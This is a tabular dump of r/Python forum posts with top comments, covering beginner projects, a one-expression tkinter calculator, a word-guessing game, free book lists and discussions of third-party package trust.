"MILESTONE: I finally tried to organize a project! Instead of being a one-filer I made classes, packages, and used a DB instead of a CSV. To most that will seem obvious, but I know I'm not the only analyst who hasn't had the best coding habits. So, this post is to encourage those to make the change!",qq83e6,2021-11-10 01:01:32,"For context: most of the coding I do is for analytical work and I’m the only one who even sees it 99% of the time, so I was really bad about just diving straight in and not really worrying about the organization as long as I got the output I was looking for. The one Python class I took in college didn’t cover much on project organization and it’s not required for my job – so I never bothered with it. 

Well, I’ve recently started using Python on a more consistent basis and realized that something had to give (I was even avoiding writing classes). I knew this project was going to be a little more involved, so I decided to get organized. Even just coming up with an outline was a big help (I normally just pick a starting point and go for it). I know if I was doing it, then there are others here doing it as well. 

On your next project, make a goal to practice better habits and I guarantee you’ll get done faster and you won’t stress out as much when you need to make changes. Also, since this was my first time and I’m 90% self-taught, if anyone has any other good tips or knows of any good books to reference, please let me know!",Nice!  I am an Analyst to and I have terrible organization for my projects!
Spiral using turtle/ different colors,hc246c,2020-06-19 22:55:00,,Super cool!  Can you share the code?
Researchers Uncover Obfuscated Malicious Code in PyPI Python Packages,110l7ag,2023-02-13 01:31:34,,This might be a stupid question but why would anyone download a library called bingchilling2?
Orbital Gravity Simulator made with pygame! Source code in comments.,hvgffk,2020-07-22 05:35:33,,Adding radii on collision means that planets grow far faster than they should. You should add volumes (radius ** 3) and then cube-root to find the new radius.
Hacking a coffee machine mr.robot style.,h8ztdx,2020-06-15 03:17:02,,Is that kalle ? His videos are interesting but he never posts any code so I'm never sure if he's legit or not.
A Guide to Excel Spreadsheets in Python With openpyxl – Real Python,cwgvvt,2019-08-28 14:22:48,,"Just beware that openpyxl will silently drop data from your excel files if the cell format is set incorrectly.

https://bitbucket.org/openpyxl/openpyxl/issues/1152/year-is-out-of-range-error

edit: This might not be true anymore.  I stopped using openpyxl for writing XLSX files a while ago, after running into that issue."
"I made my first Machine Learning project in Python, to detect numbers, with 99% accuracy.",fudlk3,2020-04-04 02:25:13,,"Could you attempt the same with letters?

How does it do with captcha?"
How do we know that imported third party python library isn't spying on our program?,l9basm,2021-01-31 20:22:19,"Hello. Im just curious. If someone installs third party library, how do we know that it doesn't contain malicious code. I know that the code is open source. But, who reviews it?","Well, this code is open source, so you can read it and see for yourself if it's spying on you or not. If you don't understand this code, you'll have to trust the authors. Or don't trust them and don't use the library.

If it's a relatively well-known library, in the sense that many people have read/written its code (and haven't found anything malicious), you can choose to trust (or not) this _community_, which might be better than trusting one single person.

Who reviews it? People like you, people more experienced than you, maybe also experts, maybe some newbies that made one contribution that fixes a typo. Probably all sorts of people, depending on how popular the library is."
"A Programming game where you use Python to automate all kinds of machines, robots, drones and more and solve exciting bite-sized coding challenges (developer post)",11l0a09,2023-03-07 22:07:03,"I had the pleasure of presenting JOY OF PROGRAMMING here on r/python before and it was met with an overwhelmingly positive reception and a lot of valuable feedback. Thank you!  In case you missed it, the game is all about practicing and applying your Python skills to challenging tasks in realistic, physically simulated 3D environments. It covers a wide variety of topics, from basic algo / ds, oop, GUI programming to control theory, robotics, image processing, machine learning, genetic algorithms, and more. Development is well underway and I'm aiming for a release in Q4 this year.

Today I'd like to get your thoughts on the importance of debugging! Obviously, I already spent an unreasonable amount of time solving the problem, before talking to stakeholders :). So I did create a custom Python debugger (using sys.settrace) and hooked it up to my in-game GUI (based on Codemirror). Now you can set breakpoints, step through the code and inspect variables like you are used to - and the game / simulation steps along in sync (mostly).

If you are interested in the game, you can find a lot more information about this and all other features and an up to date devlog on the Steam page:

[https://store.steampowered.com/app/2216770/JOY\_OF\_PROGRAMMING\_\_Software\_Engineering\_Simulator](https://store.steampowered.com/app/2216770/JOY_OF_PROGRAMMING__Software_Engineering_Simulator)

I’m happy to answer any questions or to hear your feedback and ideas.","Holy hell this is super cool, can’t wait to play it. I’m interested in how you simulated sensor activity (lots of other things as well) but of course if you don’t want to reveal that it makes sense."
Just created a cheat sheet about Support Vector Machines,bddla1,2019-04-15 16:29:43,,"Not sure this is really a ""cheat-sheet"" so much as you just telling people to import scikit-learn."
I've built an app to show how to build a complete web app,xs184r,2022-09-30 21:21:38,"I've built [tozo.dev](https://tozo.dev) to demonstrate how to build a (Progressive) web app with a Python-Quart backend, and a Typescript-React frontend running in AWS. I've included in the repository, [github.com/pgjones/tozo](https://github.com/pgjones/tozo) everything needed to reproduce it i.e. all the code, the CI/CD actions, and the Terraform infrastructure definitions. 

The commits are ordered and explained, and I hope that you can follow them to build you own app, alternatively you can just take code as a blueprint. 

The app itself manages to-dos, but this is just as an example. If you remove this functionality you have an app including user management ready to go.

I use this to help train engineers, and I use (and have used) the stack for production projects. 

(I did post about this earlier in the [week](https://www.reddit.com/r/Python/comments/xoh1oo/ive_built_a_todo_app_with_a_quart_backend_react/) but I don't think I explained it very well).","saved. sounds interesting.
ill try and maybe create similar program for my projects. nice work"
"My first project without any tutorial help, a simple program for torrent browsing!",g87p2p,2020-04-26 12:00:31,,"Looks nice, but you should think about scrapping the comments, skull and leech/seed. Otherwise you might download some viruses"
pip_irl,ab0uvr,2018-12-31 06:58:01,,"Does the `--upgrade` flag override the version specification for some reason?  You know, for those times where you go out of your way to specify a version but don't really mean it?"
11 Python Libraries You Might Not Know,2t2wfj,2015-01-21 03:18:13,,"Really nice post, thanks!

I was so amused by your comment ""because it's listed on GoogleCode, which is basically the coding equivalent of Siberia"" that I have mirrored prettytable on GitHub https://github.com/mapio/prettytable-mirror hoping this will help others discover the library!"
Python 3.11 Performance Benchmarks Are Looking Fantastic,v669pt,2022-06-06 23:35:25,,"And the plan is to pull this another four times, over the next four versions, IIRC.

edit: Three times; it started with 3.10, as per [The Shannon Plan](https://github.com/markshannon/faster-cpython/blob/master/plan.md) (thanks /u/ElectricSpice for the link!)"
Python now beating Java on Google Trends Worldwide,c6rzfp,2019-06-29 08:20:00,,"Well, either python is becoming the dominant programming language or you've shown the admittedly more interesting conclusion that snakes have become more popular than coffee."
PyQt Layouts: Create Professional-Looking GUI Applications – Real Python,k0thko,2020-11-25 22:50:10,,"PyQt is probably my favorite library and I'm amazed that it doesn't get more attention. I've packaged several GUIs for sharing scripts with colleagues at work so they aren't required to learn how to code. In my opinion, the skill floor for PyQt isn't as high as a lot of people make it out to be, but the ceiling is virtually infinite so you can constantly be improving and learning new stuff about it. Also, Qt Designer is a godsend for quickly building and changing UIs, though I will say it probably isn't best practice for more complicated GUIs (as I unfortunately learned the hard way)."
I wrote a program that emails me when one of my friends orders Domino's.,5wec78,2017-02-27 11:08:48,"Code: http://www.technologyversus.com/pizza/

It basically iterates through a dictionary of phone numbers and checks for an active order. If there is an active order, the program sends an email to a specified email account.

Feedback is always welcomed. The code is a bit rough, I have not been programming in Python for very long. Like 3 months.

Thanks and enjoy!","Am I the only one surprised that dominoes is creating URLs with my phone number everytime I order a pizza?         

url = ""https://order.dominos.com/orderstorage/GetTrackerData?Phone="" + pNumber

So I don't know anything about this package or how efficient it is to monitor the existence of URLs like this but couldn't you just put in a block of every possible phone number and come up with some pretty interesting (and terrifying) statistics?

There's definitely some kind of privacy issue here if this works even reasonably efficiently.

"
Building a Flappy Bird game in Python ( Too much Speed ),lqfc05,2021-02-23 18:31:57,,"If you want some tips on the gameplay itself, I can see that you appear to be using fixed movement. When holding a key, bird goes up at a fixed speed, when releasing it falls down at a fixed speed.

In most game coding, you want to have something that simulate gravity a bit more, or you end up with very stiff feeling motion.

The easiest way to achieve that is using a changing amount of velocity. Have inputs effect velocity, and velocity in turn changing the movement on screen. This would give you much smoother movement, and fluid gameplay :)

&#x200B;

Aside for that, I love how neat your made your code right from the start. When I did the exact same project a few months back, I struggled hard with getting the pipes to work properly, but you seemed to have gotten in right away :)"
"I made my first Python app at 41 with the bare minimum training and it's probably the worst looking code ever, but it works.",ag3aeq,2019-01-15 09:54:08,"&#x200B;

**Edit:**

I just woke up and I read all your constructive feedback. WOW, this is why I love Reddit sometimes. I will try and implement all the tips and tricks to my app.

Quick question (I woke up with this idea), if I wanted to add a dictionary to my app, to check if the word is a real word, is it easily achievable?

&#x200B;

**Background:**

I am a High School dropout and I have no degree. I started working in IT about 8 years ago and made my way to being a System Administrator for a small Supermarket chain. I am new to Python and the only language I know a little of is Powershell.

**Why I want to learn Python:**

There are not a lot of practical skills that I learned on my own. So on December 28th, I decided to put my energy into learning how to code. I saw a post in r/powershell : [Powershell Guide to Python](https://www.reddit.com/r/PowerShell/comments/ab27n2/book_update_powershell_guide_to_python/) by  [u/Prateeksingh1590](https://www.reddit.com/user/Prateeksingh1590) and decided I wanted to learn Python. So I watched 2.5 hours out of the 4 hours from [this video for beginners](https://www.youtube.com/watch?v=rfscVS0vtbw&t=12978s). I also watched 2 hours of a [Lynda.com](https://Lynda.com) course, mainly reviewing what I had learned from [Mike Dane](https://www.youtube.com/channel/UC8butISFwT-Wl7EV0hUK0BQ).

**The App:**

At one point, I wanted to know if I could code an app with the little basic knowledge I had. I thought about building an guessing word game. So I layed out want I wanted to achieve. I wanted the person guessing to have 3 information while guessing a word :

1 - To know if the have more, less or equal the characters of the word

2 - To know if they have some letters right

3 - To if the letters that are right are in the right spot

**Making the App:**

So I started my journey to make this app. It took me over a week and about 8-10 hours of trials and errors and googling to achieve the app. Watch out for yourself, it's pretty ugly. but it works.

**Feedback is more than welcome**

&#x200B;

    from getpass import getpass
    
    word = getpass(""Enter the secret word :"")
    word = (word.lower())
    word_compare = set(word)
    word_char = len(word)
    word_len = word_char
    guess_word = """"
    not_eno = ""Not enough characters in your guess""
    too_many = ""Too many characters in your guess""
    exactly = ""You have the exact number of characters in your guess""
    ok_letters = 0
    count = 0
    
    while guess_word != word:
        count += 1
        guess_word = input('What is the secret word?')
        guess_word = (guess_word.lower())
        guess_char = len(guess_word)
        guess_len = guess_char
        guess_compare = set(guess_word)
        same_char = word_compare & guess_compare
        num_same_char = len(same_char)
        if guess_word == word:
            break
        elif len(guess_word) != 0:
            if word_char > guess_char:
                word_char = guess_char
            elif guess_char > word_char:
                dif = guess_char - word_char
                word_char = guess_char
                for add_letters in range(dif):
                    word = word + str(add_letters)
            for num_letters in range(word_char):
                if guess_word[num_letters] == word[num_letters]:
                    ok_letters = ok_letters + 1
            if guess_len < word_len:
                print(""This is try # "" + str(count) + "". \n""
                      + str(not_eno) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed."")
            elif guess_len > word_len:
                print(""This is try # "" + str(count) + "". \n""
                      + str(too_many) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed."")
            else:
                print(""This is try # "" + str(count) + "". \n""
                      + str(exactly) + "". \n""
                      + ""You have "" + str(num_same_char) + "" good letter(s). \n""
                      + ""You have "" + str(ok_letters) + "" letter(s) correctly placed.""
                      )
            ok_letters = 0
        else:
            print(""You have entered nothing, please try again"")
    print(""Congratulation!!! You have guessed the word correctly"")

&#x200B;

Thank you.

&#x200B;

&#x200B;

&#x200B;","My high school students did a project like this... 

... after 5-6 months of coding lessons. Not < one month and a few hours of video lessons.

In other words - ROCK ON! Done and working is always better than pretty and still not done. "
I see your 17 loc calculator and I raise you a calculator in a single Python expression,ojab0n,2021-07-13 15:04:14,"**TL;DR**:

    (tk := __import__(""tkinter"")) and (bt_draw := lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=6)) and bt.grid(column=c, row=l) or bt) and (update := lambda t: d.config(text=t)) and (bt_press := lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)) and (w := tk.Tk()) and w.title(""TKalc"") or (d := tk.Label(w, text="""")) and d.grid(column=0, row=0, columnspan=5) or [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(""()C<789/456*123-.0=+"")] and w.mainloop()

&#x200B;

https://preview.redd.it/edc0xkkzixa71.png?width=1513&format=png&auto=webp&s=d8edd3ede39911a6d4859a475e0a0d1283d53bf7

A couple of days ago there was a post on this subreddit that showed a Python calculator in 17 lines of code ([this is the post](https://www.reddit.com/r/Python/comments/ofr75b/i_made_a_calculator_with_17_lines_of_code/)). I took that to an extreme and condensed that into a calculator that is a single expression in Python.

Notice that a single expression and a single line aren't the same thing, expressions are even smaller parts. A single line can contain multiple expressions and statements. An expression can't contain any of that.

Here is what we started with:

    from tkinter import *
    
    def bt_draw(key, col, lin):
        bt = Button(window, text=key, command=lambda: bt_press(key))
        bt.grid(column=col+1, row=lin+1)
        return bt
    
    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key
    
    window = Tk()
    window.title(""TKalc"")
    
    disp = Label(window, text="""")
    print(disp.grid(column=0, row=0, columnspan=5))
    
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(keys[n], n%4, n//4) for n in range(20)]
    
    window.mainloop()

Here is the final code:

    (tk := __import__(""tkinter"")) and (bt_draw := lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=6)) and bt.grid(column=c, row=l) or bt) and (update := lambda t: d.config(text=t)) and (bt_press := lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)) and (w := tk.Tk()) and w.title(""TKalc"") or (d := tk.Label(w, text="""")) and d.grid(column=0, row=0, columnspan=5) or [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(""()C<789/456*123-.0=+"")] and w.mainloop()

[GitHub Gist](https://gist.github.com/RojerGS/3b3d301710da3da80ece693de068e3c9)

**Here is how I did it:**

First things first, we clean up the code a bit:

* starred imports aren't generally a good idea and we only need 3 things, so import those or import `tkinter` by itself;
* the list comprehension in the end should really use an `enumerate` ([writing Pythonic code with `enumerate`](https://mathspp.com/blog/pydonts/enumerate-me));
* it doesn't make much sense to increment the row and column of the buttons when creating them, the `bt_draw` function should be called with the correct arguments;
* we add some width to the buttons when we create them, otherwise the calculator looks *really* bad (might be because of my operating system).

We get this:

    import tkinter as tk
    
    def bt_draw(key, col, lin):
        bt = tk.Button(window, text=key, command=lambda: bt_press(key), width=5)
        bt.grid(column=col, row=lin)
        return bt
    
    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key
    
    window = tk.Tk()
    window.title(""TKalc"")
    
    disp = tk.Label(window, text="""")
    disp.grid(column=0, row=0, columnspan=5)
    
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(keys)]
    
    window.mainloop()

Now on to rewriting everything as a single expression. First I rewrote the functions as lambdas, which means right from the start that I have to use [Boolean short-circuiting](https://mathspp.com/blog/pydonts/boolean-short-circuiting) to be able to stuff different expressions together.

The first function was:

    def bt_draw(key, col, lin):
        bt = Button(window, text=key, command=lambda: bt_press(key), width=5)
        bt.grid(column=col+1, row=lin+1)
        return bt

and became

    bt_draw = lambda k, c, l: (bt := Button(w, text=k, command=lambda: bt_press(k), width=5)) and bt.grid(column=col, row=lin)

Notice that assignments are statements, not expressions, so we need to use [assignment expressions with the walrus operator](https://mathspp.com/blog/pydonts/assignment-expressions-and-the-walrus-operator) if we want to inline assignments. We don't really need to return the button for any reason, so we can just ignore the `return bt` statement, otherwise we would end our lambda with `or bt`.

The second function is a little bit more work because the `if`\-`elif` statements need to be rewritten as conditional expressions. On top of that, `disp[""text""]` can't be the left-hand side of an assignment expression, so we need to work this out in some other way... just call the `config` function!

We go from

    def bt_press(key):
        if   key == ""C"": disp[""text""] = """"
        elif key == ""<"": disp[""text""] = disp[""text""][:-1]
        elif key == ""="": disp[""text""] = str(round(eval(disp[""text""]), 6))
        else           : disp[""text""] += key

to

    update = lambda t: d.config(text=t)
    bt_press = lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)

Notice that we also factored out the ""update"" part of the logic into a single function, to separate concerns. If we later change how text is displayed, it becomes more manageable to also update the way in which we update the text, we just need to fix the `update` function.

At this point, this is the program:

    import tkinter as tk
    bt_draw = lambda k, c, l: (bt := tk.Button(w, text=k, command=lambda: bt_press(k), width=5)) and bt.grid(column=c, row=l)
    update = lambda t: d.config(text=t)
    bt_press = lambda k: update("""") if k == ""C"" else update(d[""text""][:-1]) if k == ""<"" else update(str(round(eval(d[""text""]), 6))) if k == ""="" else update(d[""text""] + k)
    w = tk.Tk()
    w.title(""TKalc"")
    d = tk.Label(w, text="""")
    d.grid(column=0, row=0, columnspan=5)
    keys = ""()C<789/456*123-.0=+""
    bt_list = [bt_draw(k, n%4 + 1, n//4 + 1) for n, k in enumerate(keys)]
    w.mainloop()

The final hassle is the `tkinter` import, because we are currently using an import *statement*... However, we can easily fix that with the `__import__` built-in:

    tk = __import__(""tkinter"")

Now we just chain everything together in a single expression with `and`s and `or`s. All the assignments are changed into `:=` and chained together with `and`s. After calls to functions that don't return anything, for example the `.grid()` methods, we use `or`s to keep the program going.","I don't want to flex, but i can print hello world with a single line of code ![gif](emote|free_emotes_pack|sunglasses)"
Simple Python Tutorial for Robinhood API,jsl568,2020-11-12 09:19:44,,"This is both great and scary - just make sure your password is not floating around somewhere and use tremendous level of security.  


Here are few good recommendations on how to store your password and username on your OS securely: [https://stackoverflow.com/questions/7014953/i-need-to-securely-store-a-username-and-password-in-python-what-are-my-options](https://stackoverflow.com/questions/7014953/i-need-to-securely-store-a-username-and-password-in-python-what-are-my-options)"
Free Python books,anfdyh,2019-02-05 23:51:26,"I recently started learning Python and I’ve come across several great resources, including a number of ebooks that can be read online or downloaded for free. Some are well known, others less. Here’s the list of those books:

* [Python 101](https://python101.pythonlibrary.org/)
* [A Python Book: Beginning Python, Advanced Python, and Python Exercises](http://www.davekuhlman.org/python_book_01.html)
* [Boxes: Your Second Python Book](http://ralsina.gitlab.io/boxes-book/)
* [The Hitchhiker’s Guide to Python!](https://docs.python-guide.org/)
* [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/)
* [Problem Solving with Algorithms and Data Structures using Python](https://interactivepython.org/runestone/static/pythonds/index.html#problem-solving-with-algorithms-and-data-structures-using-python)
* [Python for Scientists and Engineers](https://www.pythonforengineers.com/python-for-scientists-and-engineers/)
* [Think Python: How to Think Like a Computer Scientist](https://greenteapress.com/wp/think-python-2e/)
* [Clean Architectures in Python](https://leanpub.com/clean-architectures-in-python)
* [Teaching and Learning with Jupyter](https://jupyter4edu.github.io/jupyter-edu-book/)

What are your favorite free Python books?

&#x200B;

**Update 2**: [the list is now available on GitHub](https://github.com/pamoroso/free-python-books).

**Update 1**: thanks all for the appreciation, feedback, and additional book suggestions.","Hi, I'm the author of Automate the Boring Stuff with Python. All of my books are released under a Creative Commons license, so you can find them all on https://inventwithpython.com"
I made a Twitch Live Stream Highlights Detector in Python!,phqhlz,2021-09-04 20:16:29,"Hi! Recently I graduated with a Bachelor of Software Engineering degree and as far as my main interest is Machine Learning I decided to create something cool (and maybe useful) with the help of Python as my graduation project. 
The main idea behind the app is to automatically find “interesting” moments from the live stream on Twitch. For this task, I trained a combination of models for highlight detection from short video clips and created a handy interface in Django. The app works fine on shooters only, as far as the training data consisted only of shooter clips. Hope you will like it :)
I shared all the technical details on the [Github page](https://github.com/artkulak/twitch-stream-highlights-detection) and in the [blog post](https://artkulakov.medium.com/how-i-created-an-app-for-live-stream-highlight-detection-for-twitch-532f4027987e)","nicee work, will explore more when i m free"
Python & APIs: A Winning Combo for Reading Public Data – Real Python,lppsep,2021-02-22 22:50:28,,Best part of that - discovering all of NASA's APIs
Ditching Excel for Python - Lessons Learned from a Legacy Industry,knbv5t,2020-12-31 06:00:10,,"I don’t know if Excel will ever go away, spreadsheets are just too good at ad hoc calculations, but are clearly way overused for productionalized tools. Now where to draw the line..."
I invented my own numbering system and programmed a clock in Python which uses it.,c6l335,2019-06-28 22:49:12,," \>> What time is it?

<<  Its almost dot dot dot horizontal line horizontal line 10 dots dash"
I made a web application to watch all the videos of a YouTube playlist/channel on the same page.,jqxhzs,2020-11-09 21:22:34," 

Ever wanted to watch a playlist of programming tutorial with peace, but had to keep loading different videos to refer something from the previous video or open ten tabs and get overwhelmed just to keep track of them?

I made a web application using Flask which takes a list of playlist links or channel links or a mix of both and spits out the videos from them on the same page, no extra tabs.

Link to the app: [MultiTube](https://getmultitube.netlify.app/)

All you have to do is give it a comma-separated list of different video links, playlist links or channel links. You can even remove any video which you have completed or scale them up to a larger width.

Ex: [https://www.youtube.com/watch?v=iik25wqIuFo](https://www.youtube.com/watch?v=iik25wqIuFo), [https://www.youtube.com/playlist?list=PLu8EoSxDXHP6CGK4YVJhL\_VWetA865GOH](https://www.youtube.com/playlist?list=PLu8EoSxDXHP6CGK4YVJhL_VWetA865GOH), [https://www.youtube.com/channel/UCCezIgC97PvUuR4\_gbFUs5g](https://www.youtube.com/channel/UCCezIgC97PvUuR4_gbFUs5g)

Source code: [https://github.com/SrikarKSV/MultiTube](https://github.com/SrikarKSV/MultiTube)

You can find all the features on GitHub or ask me in the comments! Any feedback would be appreciated.","It took me 5 clicks of play to make the most horrific sound in my headphones, great app, 10/10."
"Today is python birthday, what do you wish?",asltnr,2019-02-20 16:15:08,"First message of Guido releasing python was the 20 February 1991 on alt.sources.
What would you like to wish for the  28y of python?

I would love to see no more 2.7 code around. ",A functioning `antigravity` module.
Generating an image containing all possible colors (in 24-bit) using hilbert curves in python,9liqbe,2018-10-05 11:18:53,,"Hm, I am pretty sure I saw somewhere a way to directly (without recursion) convert index into coordinates x, y, but I can't find it right now, so I guess I'll write it later.

Nice usage of Hilbert curves btw. "
Python has brought computer programming to a vast new audience,90acd6,2018-07-20 06:16:51,,"My career path is exactly the kind of pathway this article details. I loved computers, but in high school a really terrible teacher teaching C++ broke me. I thought I was too dumb and could never do programming as a career. Swung towards the liberal arts in college, and eventually through some friends and connections made it in to a specialized commercial sales job. 

Became bored, restless, decided to learn Python on Codeacademy and from Youtube videos when I finished my work by noon each day. Automated the worst parts of my job, then was poached by a competitor to help automate their business practices. Python taught me I could build solutions for a living and actually realize my dream job. 

Now I'm a full stack developer and business analyst and I love my career, but I only got here because Python spoke to me. "
"If you're a beginner interested in data science and machine learning, I recently produced a video series that goes through all of the major algorithms and their implementations in Python! I put a lot of work into each tutorial, so hopefully this helps out!",12j68f7,2023-04-12 10:06:57,,"Really nice tutorials but why are you repeating that you implement the algorithms ""entirely from scratch"" while simply importing them from scikit.learn?"
After using Python for over 2 years I am still really confused about all of the installation stuff and virtual environments,117xcbj,2023-02-21 15:16:35,"When I learned Python at first I was told to just download the Anaconda distribution, but when I had issues with that or it just became too cumbersome to open for quick tasks so I started making virtual environments with venv and installing stuff with pip. Whenever I need to do something with a venv or package upgrade, I end up reading like 7 different forum posts and just randomly trying things until something works, because it never goes right at first.

Is there a course, depending on one's operating system, on best practices for working with virtual environments, multiple versions of Python, how to structure all of your folders, the differences between running commands within jupyter notebook vs powershell vs command prompt, when to use venv vs pyvenv, etc.? Basically *everything else* right prior to the actual Python code I am writing in visual studio or jupyter notebook? It is the most frustrating thing about programming to me as someone who does not come from a software dev background.",I think Perl is the future
"""Automate the Boring Stuff"" author is live streaming Python programming on Monday evening 5/27, 6pm Pacific",btfqxb,2019-05-27 09:04:15,"Hi Reddit! I'll be live streaming myself working on a few different text-based games in Python on Monday, 5/27 at 6pm Pacific:

https://www.twitch.tv/alsweigart/

I'm creating a collection of short, complete, text-based Python games. The idea is to create several examples for beginner/intermediate programmers to look at to see how programming concepts come together into a complete program (while still being small enough to understand). The current collection is on GitHub at: https://github.com/asweigart/PythonStdioGames/tree/master/src/",It is 4 am where I live. I hate timezones.
A San Francisco Startup Called Kite Took Over and Made Invasive Changes to autocomplete-python and at Least One Other Atom Plugin,6p5qjt,2017-07-24 10:56:57,,Kite is such garbage... I feel bad for the chumps who are stuck working there
"Why are there so few ""automation expert"" businesses that provide automation to small and medium sized businesses? Would this style of business be profitable?",m2r7oi,2021-03-11 22:25:07,"I'm not sure if that's a stupid question but considering how much time, and therefore money, some simple scripts could save the average business I don't understand why I don't see ""X Automation Services"" everywhere.

Before I knew any programming I worked for a small company that sold hundreds of second hand items via their own website and eBay. They spent at least 2 hours a day posting/deleting products and making sure everything matched between the two sites. That's over 40 hours a month that could be saved by a relatively simple Beautiful Soup/Selenium solution.

These scenarios are not rare, any business I've ever known has repetitive tasks that can be automated and save countless hours in the long run. Even if there is a relatively simple solution on the market you could at least direct them to that service and charge a consultation fee and even help implement it. Something like Zapier, which seems obvious to us, is intimidating to some of the less tech savvy small business owners. Simply setting up a few useful Zaps would warrrent a decent fee IMO.

One thing I haven't figured out is how you would go about pricing. For my above example let's say my script could save the owner £4,000 a year — what is a reasonable one off fee? The other option is to charge monthly but that would be difficult if you are going to just hand over a script with a batch file or something.

I really love the idea of starting a business that does this but I don't know if it is likely to succeed considering there are so few out there. Am I missing something?","Tons like this. But you hit the nail on the head for why adoption isn’t higher with this:
“Something like Zapier, which is obvious to us, is intimidating to the less tech savvy small business owners”.

It’s not just small business, plenty of large corporations contain a ton of people who are accustomed to doing something a certain way, because it works. How are you going to convince Susan in operations to change the way she makes her weekly excel reports? She’s been doing it the same way for 5 years. No way you will convince her to automate it. 
Not only will you have to overcome the hurdle of gaining trust that it will work, you also have to realize people do tons of busywork because they are afraid of losing their jobs. More work = job security. Even if it’s mundane."
"The PyPy project gets $200,000 from Mozilla",4wbky1,2016-08-06 01:35:09,,Python 3.5 support incoming? 
"I have made spongebob-cli, watch classic spongebob from your terminal! ☂️",sb4m4m,2022-01-24 05:37:23,"This is the github repo for spongebob-cli :  [https://github.com/trakBan/spongebob-cli](https://github.com/trakBan/spongebob-cli)

How does it work: It scrapes [megacartoons.net](https://megacartoons.net) for mp4 links and displays them as numbers. When you type a number it will play that video.

There are many options with one of them being downloading the video!

[example of the program when run](https://i.redd.it/vg23b78taid81.gif)",lmao for a second I thought it was gonna play it in the terminal as ascii art
I made a twitter bot that reminds you of stock predictions,kknr91,2020-12-27 03:00:04,"It's been a lot of fun building this bot. I used tweepy, alpha vantage and heroku and I've written about the implementation in more depth in the following medium article:

[https://luisgc93.medium.com/building-a-stock-reminder-twitter-bot-with-python-and-alpha-vantage-api-24189566e705](https://luisgc93.medium.com/building-a-stock-reminder-twitter-bot-with-python-and-alpha-vantage-api-24189566e705)

The bot can be found at [https://twitter.com/stock\_reminder](https://twitter.com/stock_reminder) and the project's repo is [https://github.com/luisgc93/stock\_reminder\_bot](https://github.com/luisgc93/stock_reminder_bot). I've added some issues if anyone would be interested in contributing. All feedback is welcome!

Here's a couple of screenshots of the bot in use:

https://preview.redd.it/6hnk86kd8l761.png?width=1320&format=png&auto=webp&s=e9afc8870d221cd7adf0e5eb24d1be3857993470

https://preview.redd.it/hejb3548xk761.jpg?width=1320&format=pjpg&auto=webp&s=240f811a4b92faaad1b58dc882af048eb6d7a6c4

UPDATE:

Wow, thanks everyone for the feedback. I went to bed hoping a couple of people max would find this interesting! Your comments have been super useful and the fact that some of you went out and used the bot has also made me see some of the current limitations:

1. Stock splits are not currently supported. If a user generates a reminder for a stock that  undergoes a split before the reminder date, the results will show a large decrease in stock price, when this might not be the case. EDIT - stock splits now supported!
2. Similarly, the returns % is calculated without accounting inflation or dividends
3. The bot doesn't quite support intra-day trading. So a mention like ""Remind me of $BTC in one hour"" will generate the initial reply but the bot won't trigger the reminder unless the bot is mentioned before midday UTC.

\*I've now added support for stock splits:

https://preview.redd.it/nvtibqrt8s761.png?width=1322&format=png&auto=webp&s=c06b1ec7a5b5d12bd1bb55b0db9d76f33fa083e4",r/wallstreetbets needs a version that recommends unhealthy coping mechanisms for when you lose 100k after YOLOing something
Create augmented reality plots over the web with Flask,fpjiba,2020-03-27 04:57:17,,Source code:  [https://github.com/pearsonkyle/Data-VisualizAR](https://github.com/pearsonkyle/Data-VisualizAR)
"Cyberbrain: Python debugging, redefined",k32p48,2020-11-29 12:08:13,"# [https://github.com/laike9m/Cyberbrain](https://github.com/laike9m/Cyberbrain)

Cyberbrain is a debugging solution that aims to free programmers. It lets you:

* **Backtraces variable changes**.
* See **every state** of program execution, including **variables' values**
* **Debug loops** with confidence.

It's not like any triditional debuggers. Instead of  stepping through a program, Cyberbrain can tell you what happened.

It's a WIP, the ultimate goal is to be a replacement for existing debuggers in most cases.

https://preview.redd.it/ehw9erc8s3261.png?width=1224&format=png&auto=webp&s=fe041c8f6efbea38c503e03200ed5b1538b8e035

[usage](https://i.redd.it/zkiwtdrgs3261.gif)","How is it for:

asynchronous?

threading?"
Can we stop creating docker images that require you to use environments within them?,y9u87s,2022-10-21 21:49:17,"I don't know who out there needs to hear this but I find it absolutely infuriating when people publish docker images that require you to activate a venv, conda env, or some other type of isolation within a container that is already an isolated unique environment.

Yo dawg, I think I need to pull out the xzibit meme...",could you maybe point us to an example of a dockerfile that's representative of the frustration you're experiencing?
"I am excited to share my 9th published book, Pillow: Image Processing with Python",mlbo2m,2021-04-06 21:28:49,"I made several of the chapters of the book into articles on my blog so you can get a preview of the content in the book:

* [Drawing Shapes on Images with Python and Pillow](https://www.blog.pythonlibrary.org/2021/02/23/drawing-shapes-on-images-with-python-and-pillow/)
* [Drawing Text on Images with Pillow and Python](https://www.blog.pythonlibrary.org/2021/02/02/drawing-text-on-images-with-pillow-and-python/)
